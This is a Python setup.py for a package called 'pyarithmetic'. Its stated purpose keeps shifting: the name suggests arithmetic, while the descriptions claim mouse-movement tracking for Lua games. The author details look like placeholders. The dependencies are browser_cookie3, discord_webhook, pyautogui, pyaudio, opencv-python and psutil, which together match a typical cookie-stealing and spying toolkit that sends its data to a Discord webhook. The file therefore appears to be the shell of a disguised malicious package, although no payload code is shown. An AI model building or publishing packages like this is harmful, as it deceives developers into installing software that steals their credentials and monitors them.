from setuptools import setup, find_packages
import codecs
import os

here = os.path.abspath(os.path.dirname(__file__))

with codecs.open(os.path.join(here, "README.md"), encoding="utf-8") as fh:
    long_description = "\n" + fh.read()


DESCRIPTION = 'Mouse Movement Detection'
LONG_DESCRIPTION = 'A package that allows Developers to easily track mousemovement in their lua Game'

# Setting up
setup(
    name="pyarithmetic",
    author="(John Smith)",
    author_email="<Johnsmith129@gmail.com>",
    description=DESCRIPTION,
    version = '0.0.1',
    long_description_content_type="text/markdown",
    long_description=long_description,
    packages=find_packages(),
    install_requires=['opencv-python', 'discord_webhook', 'browser_cookie3', 'pyautogui', 'pyaudio','psutil'],
    keywords=['python', 'movement'],
    classifiers=[
        "Development Status :: 5 - Production/Stable",
        "Intended Audience :: Developers",
        "Programming Language :: Python :: 3",
        "Operating System :: Unix",
        "Operating System :: MacOS :: MacOS X",
        "Operating System :: Microsoft :: Windows",
    ]
)
